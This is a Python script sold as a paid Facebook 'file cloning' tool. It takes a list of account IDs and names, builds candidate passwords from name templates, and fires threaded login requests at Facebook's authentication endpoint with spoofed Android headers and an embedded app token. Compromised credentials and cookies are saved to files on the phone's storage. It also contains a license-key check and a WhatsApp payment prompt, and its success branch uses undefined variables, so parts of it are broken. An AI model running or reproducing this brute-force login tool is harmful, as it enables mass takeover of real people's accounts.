#WRITTEN BY SHADIN OBROY
#FACEBOOK: মোঃ স্বাধীন আফ্রিদী
#------------import------------#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random
import httpx
import json
import sys


RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#------------------[ SHADIN-KING ]-------------------#
os.system('clear')
#------------logo------------#
logo=("""\x1b[1;96m
.d8888. db   db  .d8b.  d8888b. d888888b d8b   db \033[1;33m
88'  YP 88   88 d8' `8b 88  `8D   `88'   888o  88 \033[1;32m
`8bo.   88ooo88 88ooo88 88   88    88    88V8o 88 \033[1;97m
  `Y8b. 88~~~88 88~~~88 88   88    88    88 V8o88 \033[1;32m
db   8D 88   88 88   88 88  .8D   .88.   88  V888 \x1b[1;96m
`8888Y' YP   YP YP   YP Y8888D' Y888888P VP   V8P \033[1;33
 \033[1;91m——————————————————————————————————————————————————""")
#------------clear------------#
def clear():
	os.system('clear')
	print(logo)
	print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mDEVOLOPER \033[1;91m● \033[1;32mSHADIN AFRIDI\x1b[1;91m ')
	print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mVERSION   \033[1;91m● \033[1;32mFILE\033[1;91m [\033[1;32m1.0\033[1;91m] \033[1;32m ')
	print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mFACEBOOK  \033[1;91m● \033[1;32mMD REDOY DEOUN\x1b[1;91m ')
	print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mSTATUS    \033[1;91m● \033[1;32mPAID ')
	print(50*'—')
#------------line------------#
def line():
    print(50*'—')
#----------menu----------#
def main():
    clear()
    print('\033[1;91m[\033[1;32mA\033[1;91m] \033[1;32mFILE CLONING ')
    print('\033[1;91m[\033[1;32mE\033[1;91m] \033[1;32mEXIT ')
    line()
    option=input('\033[1;91m[\033[1;32m??\033[1;91m] \033[1;32mCHOICE MENU ❯ ')
    if option in ['a','A','1']:
        __file__()
    else:
        exit('\x1b[1;96m THANKS FOR USING SHADIN TOOL ')
#----------file----------#
def __file__():
    clear()
    filex=input('\x1b[0m[??] ENTER FILE PATH \033[1;32m❯ ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print('\x1b[1;96m File not found !!');slp(2)
        __file__()
    clear()
    try:
        pas_limit=int(input('\x1b[0m[??] ENTER PASSWORD LIMIT (1-30) \033[1;32m❯ '))
    except:
        pas_limit=1
    line()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f'\x1b[0m[??] ENTER PASSWORD {i+1} :\x1b[1;96m ')
        pas_list.append(pasx)
    with ted(max_workers=30) as Shadin:
        tl=str(len(fo))
        clear()
        print('\033[1;91m[\033[1;32m≈\033[1;91m]\x1b[1;96mTOTAL ACCOUNT \033[1;91m ❯\033[1;32m '+tl)
        print('\033[1;91m[\033[1;32m≈\033[1;91m]\033[1;33m[\033[1;32mON\033[1;97m/\033[1;91mOF\033[1;33m]\033[1;32m AIRPLANE MODE FOR SPEED UP')
        line()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            Shadin.submit(m1,ids,names,passlist)
    print(50*'—')      
    print(' \x1b[1;96mTHE PROCESS HAS BEEN COMPLETE')
    input(' \033[1;33mPRESS ENTER TO BACK : ')
    main()
loop=0
oks=[]
cps=[]
#----------method------------#
def m1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r\033[1;91m[\033[1;32mSHADIN-143\033[1;91m] \033[1;32m\033[1;33m%s\033[1;97m | \033[1;32mOK : %s '%(loop,len(oks)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': '[FBAN/FB4A;FBAV/15.0.0.912;FBBV/3800125;[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://b-graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print(f"\033[1;32m[\033[1;32mRUPA-💚\033[1;32m] \033[1;32m{uid} • {ps}" '  \n\033[1;33m [💚]\033[1;33mCookie = \033[1;97m'+coki+  ' \033[1;97m')
                open('/sdcard/SHADIN-FILE-OK.txt', 'a').write( uid+' | '+ps+' | '+coki+' \n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r\033[1;91m [SHADIN-CP-💔] '+ids+'|'+pas)
                open('/sdcard/SHADIN-FILE-CP.txt', 'a').write( uid+' | '+ps+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#----------end----------#
import os,httpx
def approval():
    SHADIN="SHADIN-"
    OBROY="OBROY"
    uuid=str(os.getuid()) + str(os.getlogin())
    key = "S".join(uuid)
    ress=httpx.get("https://github.com/SHADIN-143/SHADIN-RUPA/blob/main/Paid.txt").text
    if key in ress:
        main()
    else:
        print("\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mKEY IS NOT APPROVED")
        os.system("clear")
        print(logo)
        print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mDEVOLOPER \033[1;91m● \033[1;32mSHADIN AFRIDI\x1b[1;91m ')
        print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mVERSION   \033[1;91m● \033[1;32mFILE\033[1;91m [\033[1;32m1.0\033[1;91m] \033[1;32m ')
        print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mFACEBOOK  \033[1;91m● \033[1;32mMD REDOY DEOUN\x1b[1;91m ')
        print('\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mSTATUS    \033[1;91m● \033[1;32mPAID ')
        print(50*'—')
        print("\033[1;91m[\033[1;32m+\033[1;91m] \033[1;32m7 Day 300")
        print("\033[1;91m[\033[1;32m+\033[1;91m] \033[1;32m15 Day 500")
        print("\033[1;91m[\033[1;32m+\033[1;91m] \033[1;32mTOOL \033[1;91m[\033[1;32mPAID\033[1;91m]\033[1;32m YOU NEED PERMITION")
        print("\033[1;91m[\033[1;32m+\033[1;91m] \033[1;32mYour key :\x1b[1;96m "+SHADIN+OBROY+key)
        print('\033[1;32m--------------------------------------------------')
        name = input("\033[1;91m[\033[1;32m=\033[1;91m] \033[1;32mYOUR NAME : ")
        os.system("xdg-open https://wa.me/+8801863231665")
approval()
